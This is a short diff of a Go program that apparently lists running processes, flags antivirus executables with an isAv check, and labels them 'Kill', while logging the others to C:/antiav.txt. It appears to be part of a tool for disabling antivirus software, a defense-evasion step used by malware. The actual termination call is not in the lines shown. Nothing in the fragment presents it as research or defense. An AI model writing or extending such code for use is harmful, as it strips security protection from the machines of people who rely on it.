@@ -46,13 +46,14 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
-	f, err = os.Create("kill.log")
+	f, err = os.Create("C:/antiav.txt")
 	if err != nil {
 		panic(err)
 	}
 	defer f.Close()
 	for _, each := range list {
 		if !isAv(each.Executable()) {
+			fmt.Fprintf(f, "NoKill: %s\n", each.Executable())
 			continue
 		}
 		fmt.Printf("Kill: %s\n", each.Executable())
